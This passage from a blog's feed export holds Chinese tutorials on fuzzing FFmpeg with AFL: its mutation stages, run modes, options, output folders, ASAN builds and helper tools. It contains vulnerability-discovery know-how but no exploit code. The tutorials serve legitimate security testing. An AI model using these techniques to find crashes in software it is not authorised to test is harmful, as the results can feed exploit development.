随机选取某个word/dword，并随机选取大、小端序，将其设置为随机的interesting value 随机选取某个byte，对其加上/减去一个随机数 随机选取某个word，并随机选取大、小端序，对其加上/减去一个随机数 随机选取某个dword，并随机选取大、小端序，对其加上/减去一个随机数 随机选取某个byte，将其设置为随机数 随机删除一段bytes 随机选取一个位置，插入/替换一段随机长度的内容，其中75%的概率是插入/替换原文中随机位置的内容，25%的概率是插入/替换一段随机选取的数 随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入/替换 AFL会生成一个随机数，作为变异组合的数量，并根据这个数量，每次从上面这些方式中随机选取一个，依次作用于原文件，对原文件进行大规模的变异。正因为随机性过多，随意使得fuzz过程不可控，fuzz结果也就只能视情况而定了。 splice随机性阶段第二步也是最后一步，splice，随机选择一个文件与当前文件进行拼接并且对这个新文件执行havoc变异后作为输入。 (具体操作可参考afl源码第6048行)，AFL随机选取一个文件与当前文件进行对比。如果两者差别不大，就重新选择一个;如果两者相差，明显，则随机选择位置，将两者都分割为头部和尾部。最后，将当前文件的头部和选取文件的尾部拼接起来，就得到了新的文件。在这儿，AFL还会过滤拼接后文件未发生变化的情况。 cycle在这里还要提及的一个就是cycle,顾名思义，也就是循环。在介绍AFL表单的时候就进行了介绍，一个标准的fuzz对象完成一个fuzz周期需要的时间是较长的。当表单右上角的cycle done变为1的时候说明完成了一个周期的fuzz。 上面所有的变异结束之后，AFL会继续对文件队列的下一个进行变异处理。当队列中的全部文件都处理测试后，就等于完成了一个”cycle”。但是这并没有结束，只要用户不停止AFL或者是fuzzer没有崩溃，那么fuzz过程就会不停地运作，只不过再次对case进行变异的时候就不会执行确定性阶段了。 总结本篇主要介绍了在fuzzer使用用例对程序进行测试前对用例的一些变异处理过程。通过本篇的理解之后，再回头看AFL对用例执行生成的fuzz表单，便能够理解为什么对一个程序fuzz的过程是那么的漫长了。]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Using-Afl-fuzz之一]]></title>
    <url>%2F2018%2F08%2F30%2FUsing-Afl-fuzz%E4%B9%8B%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[AFL(American Fuzzy Lop) 前言在前一篇中我们已经把AFL的经典fuzz模式的相关内容和知识点进行了介绍，在本篇中会通过一些案例对AFL下的传统模式，-d模式，-q模式进行一一介绍，除此之外也会对之前所说的主从策略进行介绍。当跑出了crashes该怎么办呢，AFL也提供了一个辅助模式对crash进行操作，一块探讨一波吧，若有不当之处还望不吝赐教。 使用工具：环境：64位 Ubuntu 16.04GCC: version 5.4.0AFL：version 2.52FFmpeg: version 4.0.2QEMU: version 2.10.0 参考：《0day安全：软件漏洞分析技术》http://lcamtuf.coredump.cx/afl/README.txthttps://blog.csdn.net/abcdyzhang/article/details/53487683 AFL之-d模式AFL的-d模式，官方的解释就是快且脏的模式，为什么这么说呢，一般afl-fuzz在开始时会花费比较长的时间执行一系列确定性fuzzing步骤，但是会生成更为整洁的测试用例，而使用此模式则会跳过那个部分，采用随机生成的方式进行测试，所以执行速度以及结果输出是非常快的，但是准确率让人不敢恭维，使用如下指令可以是fuzzer开启-d模式： afl-fuzz -m none -i input_after_tmin/ -o afl_out/ -d ../ffmpeg-4.0.2/ffmpeg -i @@ -vcodec copy hh1.avi 同样的，使用-d模式我们依旧需要考虑到内存限制。如图，同样的目标执行指令，-d模式仅仅使用8min就已经探测到了一处crash。同时，在图中也不难发现，对于bit flips等一系列阶段都没有作用，仅仅使用了随机生成的方法进行fuzz。所以得到的数据自然显得比较杂乱。 AFL之-n模式AFL的-n模式就是传统fuzz模式也称之为盲测，就是在随机位置插入随机的数据以生成畸形文件，无论是开源亦或是闭源的程序，都可以使用盲测的方法进行测试。其执行的速度也是快于Afl-fuzz的，调用-n模式的方法如下： afl-fuzz -m none -i input_after_tmin/ -o afl_out/ -n ../ffmpeg-4.0.2/ffmpeg -i @@ -vcodec copy hh1.avi 执行结果如图所示：图中第一个箭头便指明了此模式为n模式，并不会去探索一些新路径。并且第二个箭头所指表明没有路径是favor path(*后缀)。对于采用复杂数据结构的复杂文件进行fuzz时，-n模式便显得力不从心。它产生的测试用例的策略缺少针对性，生成大量无效测试用例，并且难以发现复杂解析器深层逻辑的漏洞等。 AFL之-Q模式它可以用来模拟机器，QEMU是一个完整的可以单独运行的软件，非常灵活和可移植。而AFL就是利用QEMU的user emulation模式帮助建立独立特征，获取闭源二进制程序进行插桩输出，从而解决了无法使用afl-gcc等编译的目标程序的测试问题。 但是与上述两种模式不同的是，并非将特定参数指定为-Q之后就可以开启该模式，我们需要进行环境的配置，先保证安装了qemu，然后在afl的解压目录下有一个qemu_mode文件夹，使用里面的脚本即可创建环境，指令如下： sudo apt install qemu cd qemu_mode ./build_qemu_support.sh 执行之后可能会出现如下的报错信息： 原因在于缺少相应的文件依赖，缺什么就装什么，我们提示缺少的文件直接作为命令输入，便会提示相关的安装方法，执行如下指令即可解决(顺带有可能缺少的文件)： sudo apt install libtool-bin sudo apt install automake sudo apt install bison（缺少bison） sudo apt install libglib2*（缺少glib2） 相应的文件依赖全部安装完毕之后，我们就可以成功的执行sh脚本进行环境的搭建，经过一段时间的等待之后，我们就可以接到已经可以在AFL中使用-Q选项的提示： 可是，你以为它他说你能用了就真的能用了嘛，太天真了，亲测有可能还是会报如下错误，不过问题不大，只需要进入afl的解压目录下重新执行一次编译安装的过程即可。 既然要使用-Q模式，那我们就不使用afl-gcc编译，直接将FFmpeg安装起来进行测试好了，只需要重新执行编译，再补充一个安装指令即可。此时我们便可以将特定参数改为-Q便可以使用该模式进行fuzz，指令如下： sudo afl-fuzz -i input_after_tmin/ -o afl_out/ -Q ffmpeg -i @@ -vcodec copy hh1.avi 通过afl-gcc等编译过的无法使用该模式进行fuzz，如果强行使用-Q模式fuzz的话，则会出现如下错误： 另外，在进行-Q模式进行fuzz前。最好保证输出目录是空的，否则可能会报如下错误： 除了上面两个问题外，由于-Q模式运行需要一定的内存限制，更何况fuzz的对象是FFmepg这个毛茸茸的程序，所以还可能会报如下错： 解决这个问题只需要使用-m/-t对延时和内存的限制进行适度放大即可，具体设置多少视情况而定，但这样的话也可能会使得fuzzer生成确定性测试用例的时间变长。 最终输入如下指令便可对FFmpeg进行-Q模式的fuzz： sudo afl-fuzz -m none -i input_after_tmin/ -o afl_out/ -Q ffmpeg -i @@ -vcodec copy hh1.avi 运行fuzz表达如图可见,和AFL默认模式似乎没有什么区别，但是，大家应该看到zzzz了，是的，跑fuzzer的机器性能不好，还有就是，-Q模式自身运作就需要一定的内存限制，所以运行的速率就会比AFL慢一些。 AFL之-M/S策略-M(确定性策略)，-S(随机混乱性策略)，定义就不多赘述，在前一篇已经介绍过了。当我们对一个程序进行测试，电脑有两个CPU及以上的话，我们就可以使用并行策略提高效率。一次fuzz过程只需要一个确定性fuzzer和一个或多个随机混乱fuzzer，如果不使用并行fuzz的方法，那么fuzzer在执行过程中会在两个策略间来回转换，降低效率，并行策略恰好可以解决这个问题。 使用如下指令，在相应位置使用-M或-S并指定输出目录即可运行两个fuzzer： afl-fuzz -m none -i input_after_tmin/ -o afl-out/ -M fuzzer1 ../ffmpeg-4.0.2/ffmpeg -i @@ -vcodec copy hh1.avi afl-fuzz -m none -i input_after_tmin/ -o afl-out/ -S fuzzer2 ../ffmpeg-4.0.2/ffmpeg -i @@ -vcodec copy hh1.avi 上图就是使用确定性策略的fuzz表单，可以看到与默认的显示似乎没有什么却别，但是指定策略后，fuzz时不会使用havoc阶段。 上图是使用的随机混乱策略的fuzz表单，与确定性策略的表单正好相反，该策略下的fuzz只会使用favoc阶段进行fuzz。 AFL之-C模式好了，假设我们使用上面的任意一个模式或者是AFL的默认模式已经把目标程序的内部检查了个遍，也记录了不少的crashes，下面所要做的就是对这些crashes进行分类，但是，想要确定某个crash是否具有可利用性，就需要进行大量的代码分析工作。 人性化的AFL为了帮忙完成这个任务，便提供了一个独特的辅助模式——“crash exploration” mode,与其他模式相同点在于调用指令依旧是afl-fuzz加上对应的标志字符即可： afl-fuzz -m none -i afl_out/crashes/ -o afl-out/ -C ../ffmpeg-4.0.2/ffmpeg -i @@ -vcodec copy hh1.avi 与其他模式测试不同的是，这里会先对crashes用例进行操作，如下图所示，在此模式下fuzzer会将一个或多个crashes作为输入，并且执行个测试阶段来枚举出所有的代码路径，可在程序中访问，同时保持在崩溃的状态。 要注意的是，在该模式下的输入只能是测试得到的crashes，一些无法导致崩溃的用例将会被拒绝。如果在输入文件夹中混入了queue文件夹或者是正常用例文件夹下的用例的话，那么就会报错，如图所示： 当正确输入用例成功运行这个模式后，会出现如下图所示的状态表单： 从这个表单可以看出，由于输入的都是已经测试得到的crashes，所以仅仅36s就出现了51个崩溃，还有4个唯一崩溃，细心的童鞋也能够发现，状态表单的标题也已经改变了，至于为什么叫这个标题的意义不大，有兴趣的童鞋可以探索一波。 此模式下的输出与测试模式的输出类似，除了没有fuzzer_stats以及fuzz_bitmap两个数据文件，其他数据文件或者是文件夹所保存的信息基本一致。 注：如果想要对得到的crashes进行优化处理，同样可以使用fuzz-tmin 总结本篇主要介绍了AFL下出默认模式外的其它模式，每个模式都有其优点，同时也存在弊端，除此以外还介绍了并行策略，主要用以提高fuzz的效率，”crashes exploration” mode辅助对测试所得的crashes进行复测。至此AFL下的基本使用已经全部介绍完毕了。]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Using-Afl-fuzz之一]]></title>
    <url>%2F2018%2F08%2F29%2FUsing-Afl-fuzz%E4%B9%8B%E4%B8%80%2F</url>
    <content type="text"><![CDATA[AFL(American Fuzzy Lop) 前言紧接上篇，我们对AFL的基本知识、安装和功能，在使用AFL对目标程序进行fuzz之前需要的准备工作以及AFL自带的一些辅助工具等功能都已经做了比较详细的介绍。这次就直奔主题，以FFmpeg为例使用AFL对其进行fuzz(开源)，并且介绍相关知识点。有关AFL的具体知识点可以参考官方白皮书 使用工具：环境：64位 Ubuntu 16.04GCC: version 5.4.0AFL：version 2.52FFmpeg: version 4.0.2 参考：http://lcamtuf.coredump.cx/afl/README.txthttps://blog.csdn.net/abcdyzhang/article/details/53487683 0x00 AFL选项如果已经成功安装了AFL,那么在terminal里输入afl-fuzz或者加上选项–help可以调出工具的所有选项。 工欲善其事必先利其器，这里先对选项进行介绍，之前AFL的辅助工具也有一些选项是和这里所要介绍的选项有相同的作用。 如图所示就是afl-fuzz –help调出来的option表。 -i dir： 选项后跟一个目录，该目录为fuzz目标程序时所需要的测试用例，也可指定某个用例进行fuzz -o dir： 选项后跟一个目录，该目录为fuzz目标程序后指定的数据输出目录。 -f file：选项后跟一个文件，此文件为目标程序的读取位置，使用此选项可以将数据写入特定数据中，一般在目标程序需要特定类型拓展名的时候非常有用。 -t msec： 此选项用于控制fuzz目标程序覆盖路径的最大延时。(默认限制为50-1000ms) -m megs： 此选项用于控制fuzz目标程序是可以使用的内存限制，与延时限制的设置一般用于对编译器或是视频解析器等程序的fuzz。(默认限制为50M)，在对FFmpeg的fuzz中就需要对内存进行了限制。 -Q：之前所提及的Q模式就是用它来控制，fuzz时候加上这个选项就开启了Q模式，可对闭源的二进制程序进行fuzz。 -d：字面意思是快且脏的模式，正常使用AFL的时候能够清晰准确的分析并覆盖路径并输出结果，但一个完整周期的fuzz需要花2-3天的时间，而-d选项则会使得fuzz速度变快。只不过结果不太准确且数据比较杂乱。 -n：传统的fuzz模式，只是盲目的进行fuzz，同样是速度比正常模式快而准确性不太高。 -x dir： -x模式需要制定一个字典，这个字典的作用在于解决构建语法感知工具的麻烦，afl-fuzz工作时，处理多媒体，正则表达式等数据是，与冗长的语言语法不太友好，所以使用可选的语言关键字字典作为种子进行运作，并在过程中重建语法。 -T：使用这个选项只是为了显示文本信息，让fuzz过程可见 -M/S：AFL的两种fuzzing策略，M：确定性策略，S:随机混乱策略。一次fuzz过程只需要一个确定性fuzzer和一个或多个随机混乱fuzzer，如果不指定策略的话，fuzz实例会在策略间来回切换（说白了就是提升效率用的。） -C：这个模式是专门用来对崩溃点(crashes)进行测试的，后续还会介绍其他工具进行测试。 运行AFLoptions了解以后就可以使用AFL对FFmpeg进行fuzz测试了。输入文件夹和输出文件夹以及测试程序都是必须的，有的测试程序还需要对内存和延时作限制。而FFmpeg是一个视频处理工具，我们可以先看看如果不对内存作限制会如何，输入以下指令(这里没有对FFmpeg执行make install，所以要指定正确的程序路径)： afl-fuzz -i afl_input/ -o afl_output/ -- ffmpeg -i @@ -vcodec copy hh.avi 如果是刚安装完毕AFL的同学，也许第一次测试会出现如图所示出现的报错信息，当然不仅如此，如果装有AFL的机器重启之后，同样会出现这样的报错信息： AFL不仅可靠，还非常的人性化，有许多的问题都罗列在程序中，被触发就会给予提示，图中就给出了相关的解决方案： echo core &gt;/proc/sys/kernel/core_pattern 这是因为没有开启系统的coredump。在root权限下所输入上述指令就可以解决。然后第二个问题就会跑出来，如果看过AFL辅助工具介绍的会发现在对testcase进行处理的afl-cmin、afl-tmin以及afl-analyze等也同样需要进行内存限制，否则会有报错，没有设置内存限制的报错如图所示： 所以我们必须加上内存限制,那么需要给多少内存呢？这个问题在前一篇介绍ASAN中就已经有所涉及了，这次编译的FFmpeg开启了ASAN mode 同时还是64位编译，所以需要的内存限制非常大，若只分配1G这种不足的限制，会出现如图错误信息。 afl-fuzz -m 1024 -i afl_input/ -o afl_output/ -- ffmpeg -i @@ -vcodec copy hh.avi 所以我们可以不考虑他想要的大小，直接设置-m none,这样便可以进行fuzz了（当然如果知道程序所需的最小内存需要的话，还是建议限制）。 afl-fuzz -m none -i afl_input/ -o afl_output/ -- ffmpeg -i @@ -vcodec copy hh.avi fuzz程序成功运行后，会在terminal中显示一个表格如图所示： emmm,请忽视电脑不给力和速度的zzzz….，人家只是一个例子。我们在等待fuzzing的时间也不浪费时间，下面就简单说一下数据意义。 tittle AFL工具全称为American fuzzy lop以及fuzzed program是ffmpeg。 process timing 运行fuzz的总时间 最后一个新路径被发现的时间到现在的时间间隔。 最后一个唯一崩溃被发现时间到现在的时间间隔。 最后一个唯一挂起被发现时间到现在的时间间隔。 overall results 完成的周期数 总共覆盖到的路径数。 测试到的唯一崩溃点数，一旦发现了崩溃处，则此处数值直接显示红色。 测试到的唯一挂起数。 cycle progress 这个模块主要告知fuzz与当前周期队列结束的距离，有时在第一行的数据会有一个*后缀说明，该路径已不是最优路径。 显示当前处理的用例的ID和数量。 显示路径的延时。 map coverage 显示已有的分支元组命中个数并与可容纳总数成比例，左边的值是输入，右边的值相当于语料库总值。 计算覆盖率。 stage progress 显示现在的执行的当前阶段（一共有9个阶段，如有兴趣可参考白皮书了解）。 显示当前步骤执行进度。 显示总的执行大小。 显示进行中的速度（正常速度为绿色，slow!和zzzz..为红色）。 findings in depth 显示找到的最优路径数。 显示最新的边缘覆盖总数。 显示测试发现的崩溃数以及唯一的崩溃数，一旦发现了崩溃处，则此处数值直接显示红色。 显示测试发现的总的超时用例数。 fuzzing strategy yields 这里的数据是用以验证fuzz的效率，bit flips之类是上述的执行阶段的名称，每个阶段名称后都有三个数字： 第一个数字表示从输入中文件中删除的字节数的比率。 第二个数字表示实现此目的所需的执行数。 第三个显示了那些被认为无用却无法移除，通常被重要程序准确fuzz所排除的字节的比例。 path geometry 显示当前执行的等级，由用户提供的测试用例被认为是level 1，通过传统fuzz推理能够得到的测试用例被认为是level 2，使用1，2作为后续fuzz的输入而得到的测试用例为level3等等。等级数代表从afl-fuzz中获得多少的推算值。 显示尚未进行任何fuzz测试的输入数量。 显示fuzzer选择的最优条目（只的是fuzzer希望在本队列周期中达到的条目，非最优条目可能需要等待几个周期才能获得机会）。 显示fuzzer在测试部分寻找到的新路径的数目。 显示在执行并行fuzz的时候从其他fuzzer中导入的用例数目。 显示测试观察到的痕迹的一致性。如果一个程序对于相同的输入数据的表现总是相同的，则显示100%，若百分比值较低但是依旧显示为紫色，则不会对fuzz结果产生影响，但如果此数值变为红色，AFL将很难区分输入数据是否有意义。 cpu 显示CPU的使用情况，正常使用显示为绿色，当显示红色时就表示计算机超额使用了CPU，但也不影响程序继续fuzz,只是不建议同时再运行另一个fuzzer。 注：在fuzz图标的众多信息中我们不必全部都有所关注，主要根据需求去观察相关的数据即可。 Afl输出把fuzzer开着，然后去吃一把鸡，回头再来看看afl的输出，如图所示，在使用afl对目标程序进行fuzz的时候就会在指定的输出目录下生成六个文件夹，然后会将fuzz过程中的相关数据分类存放于文件夹中，下面就分别介绍一下吧。 crashes：此文件夹下存储的是在fuzz过程中寻找到的崩溃用例，但只会保存唯一崩溃。可用来进行分析从而发现目标程序的漏洞。如图所示，崩溃用例会自动按顺序进行命名。 fuzz_bitmap：该文件夹下存储的是正在fuzz过程中生成的以位map数据，afl-showmap同样可以显示map数据，但两者的数据截然不同。如图所示就是使用hexdump查看的fuzz_bitmap的数据。 fuzzer_stats：这是一个文本文件，实时记录了fuzz过程中表单中的所有数据，除此以外还包括了fuzzer版本，fuzz指令等详细数据。如图所示 hangs：该文件夹存放了在测试过程中超时被挂起的所用测试用例。 plot_data：此文件夹存放了fuzz过程数据，包裹时间、行为等，辅助工具afl-plot便是利用此中数据进行构图， queue：该中存放了在fuzz过程中探索到的所有路径，每一个路径对应一个测试用例。 总结在本篇中介绍了AFL的使用选项、运行中可能遇到的问题，运行显示在terminal的图标信息以及fuzze的输出，到这里已经基本了解了这个测试大杀器，从输出的fuzzer_stats可以发现，fuzz的时间很短（不一定非要完成一个周期），得到的crash也不一定就是能利用的漏洞，心急吃不了热豆腐，让fuzzer过程更长一些才是明智之举。但是，本节仅仅以基本的fuzzer模式进行了介绍，afl还有许多其他的运行模式与策略，这些就等到下一篇在进行介绍吧。]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Studying-Afl-fuzz之原理环境介绍]]></title>
    <url>%2F2018%2F08%2F27%2FStudying-Afl-fuzz%E4%B9%8B%E5%8E%9F%E7%90%86%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[AFL(American Fuzzy Lop) 前言本篇文章对AFL的安装、使用做了介绍，同时使用软件FFmpeg作为fuzz目标介绍了在使用AFL过程中需要注意的一些点，例如ASAN的开启，软件的编译等。参考各位的文章自行学习，如有错误，请各位纠正。 使用工具：环境：64位 Ubuntu 16.04GCC: version 5.4.0AFL：version 2.52FFmpeg: version 4.0.2 参考：http://lcamtuf.coredump.cx/afl/README.txthttp://www.xue63.com/toutiaojy/20180103G0IUER00.htmlhttp://www.cnblogs.com/WangAoBo/p/8280352.html Fuzzing技术是当前最为强大而有效的漏洞挖掘技术，大多的远程代码执行以及权限提升等较为严重的漏洞都是通过Fuzzing而产出的。但是Fuzzing技术目前依旧存在着限制，许多的代码漏洞都需要更大的路劲覆盖率才可能触发，并非简单的随机尝试就能够得到的。 有方法，必须能执行，AFL(American Fuzzy Lop)被称为目前最高级的Fuzzing测试工具之一，他是由Google的Michał Zalewski开发的一款开源工具。可以有效地对二进制程序进行fuzz，开启相应功能可更深入的根据需求挖掘相关漏洞，如栈溢出、堆溢出、UAF等。 AFL有两种fuzz途径： 开源软件：AFL软件进行编译的同时进行插桩，以方便fuzz 闭源软件：配合QEMU直接对闭源的二进制代码进行fuzz 无可厚非的是利用插桩技术对软件fuzz的执行效率肯定是高于闭源项目的。 这里简要先介绍一下插桩。插桩：在AFL编译文件时候afl-gcc会在规定位置插入桩代码，可以理解为一个个的小断点(但是没有暂停功能)，在后续fuzz的过程中会根据这些桩代码进行路径探索，测试等。使得测试覆盖面更广，更全面。 另外，在每个分支插入桩代码的同时，afl-as会生成一个随机数作为标识这个代码块的key，运行时便可以利用这些生成的随机数来识别相应代码块。 0x00 AFL简介与安装AFL简介AFL的本质已经在上面提及，这里说说构造：AFL主要是由三部分组成： 编译器wrapper：他的功能在于对目标软件（开源）进行编译，编译过程中插入一些AFL识别的函数用以识别探索路径，众所周知的linux下的C/C++编译工具gcc/g++，afl的编译工具为afl-gcc/afl-g++,afl-clang等。具体编译操作后续会有介绍。 测试器fuzzer：afl-fuzz，就是AFL重要的主体，用以对软件进行fuzzing。 其他工具：如afl-cmin,afl-tmin等，一个成功的C位都必须多个辅助才行，这些工具都是为提升测试的效率和成功率而服务的。 AFL安装这里直接给出AFL-fuzz的官网 注意：我们使用的环境是64位Ubuntu 16.04，确保依赖的llvm，clang都已经正常安装，指令如下： sudo apt-get install clang sudo apt-get install llvm 找到如图所示位置，点击下载最新版本的安装包（当前最新是2.52版本）。 wget http://lcamtuf.coredump.cx/afl/releases/afl-2.52b.tgz 安装包下载完成后进行解压，依次执行下述命令： tar -zxvf afl-2.52b.tgz cd afl-2.52b make sudo make install 在编译安装过程中无报错信息，即为安装成功，可直接用afl-fuzz进行调用： 0x01 FFmpeg简介与安装俗话说，没有绿叶承托，怎显花朵美丽——沃兹基硕德 正如AFL的强大若是无软件测试，功能无处施展，那最高级测试工具的称号又从何而来？ FFmpeg简介这里先用FFmpeg作为编译的例子来介绍一下如何为afl-fuzz做好准备(此例用以介绍开源程序的fuzz)，它是一个很强大的音频处理工具，同样附上FFmpeg官网，是一个完整的、跨平台的解决方案，可以记录、转换和传输音频和视频。 FFmpeg安装官网的download目录下即可点击下载或者指令下载： wget https://ffmpeg.org/releases/ffmpeg-4.0.2.tar.bz2 我们创建一个afl-fuzz文件夹用于存放这些绿叶，然后将安装包进行解压，编译安装三部曲，如若我们下载FFmpeg只是让他施展才能的直接使用如下命令 tar -jxvf ffmpeg-4.0.2.tar.bz2 cd ffmpeg-4.0.2/ ./configure make make install 但是，在这里，我们只是为了对它进行测试，尝试去探索漏洞，如果我们使用Q模式进行测试，那么可以直接使用上述的安装命令，但倘若我们使用的是插桩技术的话，这里我们的编译过程就有所不同。 我们希望把编译好的文件生成到指定目录，可以在配置的时候进行指定，(不建议使用–disable-x86asm参数)命令如下： ./configure --prefix =（目录地址) 注意：在配置的是可能会出现如图的错误，很好解决，只需要安装或者跟新对应的nasm/yasm即可。 sudo apt-get install nasm/yasm 另外，这里的目标是一个图片、视频处理软件，如果我们的fuzz的对象是一个库文件的话，一般在配置执行的时候加上–disable-shared选项，这是用来告诉编译器，我们想编译得到的是静态库(在最后调用库函数的时候，不需要再去考虑解析的问题了)，而非是动态链接库 配置执行完后可有两种方法用指定的afl-gcc/afl-g++进行编译 设置环境变量（适用于基于环境的库文件编译）：顾名思义，我们可以将CC与CXX（分别对应C于C++）设置环境变量指定为afl-gcc与afl-g++，然后make进行编译。 export CC=afl-gccexport CXX=afl-g++ 设置mak文件（适用于所有的看开源软件目标）:在配置跑完后，会在ffbulid下生成一个config.mak的文件，我们需要做的就是把里面CC以及CXX复制的gcc和g++全部改为afl-gcc和afl-g++后进行make编译即可。 如上图所示，当出现了afl-gcc以及afl-as的标志，表示成功使用afl进行编译 注：在make命令执行的时候，我们可以设置AFL_HARDEN=1，可以促使CC自动化代码加固，试得检测简单的内存bug更加容易。Libdislocator是AFL提供的一个辅助库，能帮助发现堆崩溃问题。 由于这里是对软件进行fuzzing，所以这里就不必继续执行make install了，使用命令行调用相关位置的ffmpeg工具即可，如图所示： 0x02 ASANASAN简介ASAN(Address Sanitizer)是linux下的内存检测工具，早先是LLVM中的特性，后来被加入GCC 4.9，现被clang和gcc支持，用于运行的时候对内存进行检测，以达到发现内存漏洞的效果。 在开启ASAN后。afl插桩则会在目标代码的关键位置添加检查代码，例如：malloc(),free()等，一旦发现了内存访问错误，便可以SIGABRT中止程序。 注意： 例如越界读等内存访问错误不一定会造成程序的崩溃，所以在没有开启ASAN的情况下，许多内存漏洞都无法被AFL给发现。所以在编译二进制代码的时候，强烈建议开启ASAN。 ASAN开启后的fuzzing会消耗更多的内存，这是需要注意的因素，对于32位的程序，基本上800MB即可；但64为程序大概需要20TB,所以，使用ASAN的话，建议添加CFLAGS=-m32来限制编译目标为32位，否则，可能应为64位消耗内存过多而造成程序崩溃。 在使用了ASAN之后，可以再alf-fuzz的时候通过选项-m来指定使用的内存上限。启用了ASAN的32位程序，一般设置-m 1024即可。 ASAN的使用 ASAN是GCC支持的一个性能，所以，在使用ALF对软件进行编译之前，只需要设置环境变量即可，指令如下： export AFL_USE_ASAN=1 ASAN的开启，如果是针对小程序的话，只需要在编译的同时，加上选项–fsanitizer=address即可。 编译过程中，见到图中的ASAN mode的标志就说明成功开启了ASAN进行编译。 编译结束之后，为了保证我们的软件成功的开启了ASAN并且在目标代码的关键位置插入了检查代码，我们还需要用命令进行检测，命令如下: strings ffmpeg |grep &apos;asan&apos; 若已经成功的开启ASAN编译了目标软件，则会看到如图结果： 0x03 Other tools前面已经介绍了AFL的编译wrapper，在对一个对象进行测试之前这一步是必须的（别抬杠，我知道除了Q它），这里介绍一下AFL的一些辅助工具，利用这些工具可以使得测试任务事半功倍。 afl-cmin如果说AFL是一把狙击枪（管他AWM还是巴雷特），那么afl-cmin可以比作是红外瞄准器。afl-cmin的工作需要给定一个包含有可能的(两个以上)testcases的文件夹，他会运行每一个收到的反馈与其他所有的testcases进行对比，以找到最具有代表性的testcase，将其保存到新的目录。在进行测试的时候可以直接使用这个新的testcase，可以使得测试效率提升不少。 使用FFmpeg的testcase为例，输入如下命令运行afl-cmin(有关参数会具体讲述)： afl-cmin -m none -i afl_in/ -o input_after_cmin/ -- ../ffmpeg-4.0.2/ffmpeg -i @@ 稍等读条结束便会在指定的目录下生成新的文件，如图所示： afl-tmin众所周知，红外瞄准器可辅助狙击枪达成目的，但是要是有了倍镜就能更为有效的完成目标。afl-tmin便是AFL的倍镜。 afl-tmin的工作对象是一个指定文件，当我们进行fuzz的时候，谁都不希望浪费任何一颗子弹，浪费CPU去处理相对testcase表示代码路径无用的bit或者byte是没有任何意义的。afl-tmin会遍历tesecase的真实字节，逐步地删除很小的数据块，直到删除任意字节都会影响到代码路径表示。这样一来，AFL便可以直击要害，高效而有精确的get crashes。 这里我们可以对testcase进行处理，当然也可以对经过cmin处理后的文件进行处理，但必须对输入进行指定文件，输入如下命令运行afl-tmin(有关参数会具体讲述)： afl-tmin -m none -i input_after_cmin/hh3.mp4 -o input_after_tmin/hh.mp4 -- ../ffmpeg-4.0.2/ffmpeg -i @@ 稍等读条结束便会在指定的目录下生成新的文件，如图所示，从图中便可以看出tmin以及把testcase删减了很多无用的块和路径。 afl-analyze这个工具也是AFL下的一个分析工具，他需要一个输入文件，我们既然对一个软件进行测试，那么输入的文件使用tesecase即可，然后afl-analyze会尝试着去翻转这个文件的字节，输入到目标软件观察其行为，之后会根据tesecase的代码的关键性进行字节的编码着色。能够深入的探索并了解复杂的文件结构。 还是以FFmpeg为例，我们输入如下指令便可以看到afl-analyze的代码颜色分类(有关参数会具体讲述)： afl-analyze -m none -i afl_in/hh.mp4 -- ../ffmpeg-4.0.2/ffmpeg -i @@ 然后就是静候，运行时间其实取决于testcase的大小，建议30K以内(若testcase太大，那么执行afl-analyze包括后面要说的afl-fuzz都是一个很大的负担)，最终分析结果如图所示(截取其中一部分展示)。 afl-plot这是一个纯辅助工具，作用在于将一个正在fuzz的输出目录或者已经fuzz完成的输出目录进行分析，利用生成的plot数据自动生成数据图片让fuzzer更方便的分析了解。在输出目录中会生成一个index.html以及三个png格式图片，可以使用浏览器查看，但是需要实现安装gnuplot才可以。 使用如下命令即可安装gnuplot: sudo apt-get install gnuplot 然后在terminal中输入： gnuplot 若出现Terminal type set to unknown.那么还需要再安装x11： sudo apt-get install gnuplot-x11 至此就已经完成gnuplot的安装并可以使用。 下面便可以使用afl-plot生成图片，格式如下： sudo afl-plot afl_state_dir graph_output_dir 这里用选项M下生成信息作为例子，如图输入指令后便可以生成图片并保存在指定的文件夹： 可以看到如介绍所言，生成了index.html和三个picture。 我们使用下述指令便可以访问查看生成的图了： firefox index.html afl-whatsup这个工具是在afl的输出目录下进行检查，对afl测试过程中或者结束后的输出结果进行统计(fuzz时间，文件大小，crash个数等。)如果加上选项-s则只检查当前目录，不会遍历统计，显示总体的统计结果。指令如下： afl-whatsup [-s] afl_sync_dir 结果如图(还在fuzz的目录)： afl-showmap这个工具是用来跟踪目标软件(这里是FFmpeg)在有输入时的运行、映射关系，并用-o参数指定输出。指令如下(有关参数会具体讲述)： afl-showmap -m none -o afl_map/showmap.txt ../ffmpeg-4.0.2/ffmpeg -i input_after_tmin/hh.mp4 运行结束则会在指定目录下生成跟踪数据(数据太大就不进行展示了) afl-gotcpu顾名思义，这个工具就是用以获取CPU的使用率，如图所示，正在执行两个fuzz，cpu以及超负荷显示红色(电脑性能不好，难受)。 换一台高性能些的电脑吧。这样就能看到还有多少资源可以被使用，多少的资源正在运行。如图所示： 0x04 总结至此,已经对AFL的安装、功能做了基本介绍，另外以FFmpeg为例，对fuzz之前的准备工作做了详细介绍，除此以外，还把AFL的各个辅助工具做了介绍，后面会继续以FFmpeg作为对象，具体介绍fuzz的过程。包括之前提及的参数问题、分析问题等。]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb.attach跟exp]]></title>
    <url>%2F2018%2F05%2F30%2Fgdb-attach%E8%B7%9Fexp%2F</url>
